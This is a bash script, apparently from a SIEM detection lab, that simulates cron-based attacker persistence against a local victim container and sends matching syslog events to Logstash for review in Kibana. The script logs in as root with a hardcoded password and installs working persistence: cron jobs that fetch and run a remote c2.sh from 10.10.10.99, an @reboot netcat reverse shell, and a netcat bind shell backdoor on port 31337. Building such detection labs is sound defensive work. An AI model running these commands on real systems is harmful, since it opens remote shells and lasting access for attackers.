#!/bin/bash
# =============================================================
# Scenario 03: Persistence via Suspicious Cron Job
# Simulates an attacker establishing persistence through crontab
# =============================================================

TARGET_HOST="localhost"
TARGET_PORT="2222"
LOGSTASH_HOST="localhost"
LOGSTASH_PORT="5000"

echo "[*] Starting Suspicious Cron Job simulation..."
echo ""

# Phase 1: Send suspicious cron events to SIEM
echo "[*] Phase 1: Sending suspicious cron events to SIEM..."

CRON_EVENTS=(
  "<85>$(date) victim cron[1337]: (root) CMD (curl -s http://10.10.10.99/payload.sh | bash)"
  "<85>$(date) victim cron[1338]: (root) CMD (/tmp/.hidden_backdoor &)"
  "<85>$(date) victim cron[1339]: (root) CMD (nc -e /bin/bash 10.10.10.99 4444)"
  "<85>$(date) victim cron[1340]: (root) CMD (python3 -c 'import socket,subprocess,os')"
)

for event in "${CRON_EVENTS[@]}"; do
  echo "$event" | nc -u -w1 ${LOGSTASH_HOST} ${LOGSTASH_PORT}
  echo "  [!] Cron event: $event"
  sleep 0.5
done

echo ""
echo "[*] Phase 2: Installing real persistence on victim container..."

# Phase 2: Real cron persistence on victim
sshpass -p "victim123" ssh \
  -o StrictHostKeyChecking=no \
  -o ConnectTimeout=5 \
  -p ${TARGET_PORT} \
  root@${TARGET_HOST} bash << 'REMOTE'
echo "[+] Current crontab:"
crontab -l 2>/dev/null || echo "  (empty)"

echo ""
echo "[+] Installing malicious cron jobs..."

# Create hidden malicious script
cat > /tmp/.persistence.sh << 'SCRIPT'
#!/bin/bash
curl -s http://10.10.10.99/c2.sh | bash
SCRIPT
chmod +x /tmp/.persistence.sh

# Install cron jobs
(crontab -l 2>/dev/null; echo "* * * * * /tmp/.persistence.sh > /dev/null 2>&1") | crontab -
(crontab -l 2>/dev/null; echo "@reboot nc -e /bin/bash 10.10.10.99 4444") | crontab -

echo "[+] Malicious cron jobs installed:"
crontab -l

echo ""
echo "[+] Creating hidden files for persistence..."
mkdir -p /tmp/.hidden
echo '#!/bin/bash' > /tmp/.hidden/backdoor.sh
echo 'while true; do nc -l -p 31337 -e /bin/bash; done' >> /tmp/.hidden/backdoor.sh
chmod +x /tmp/.hidden/backdoor.sh
ls -la /tmp/.hidden/
REMOTE

echo ""
echo "[+] Scenario 03 complete."
echo "[+] Check Kibana for: tags:suspicious_cron"
echo "[+] Events sent: 4 cron events + real persistence installation"
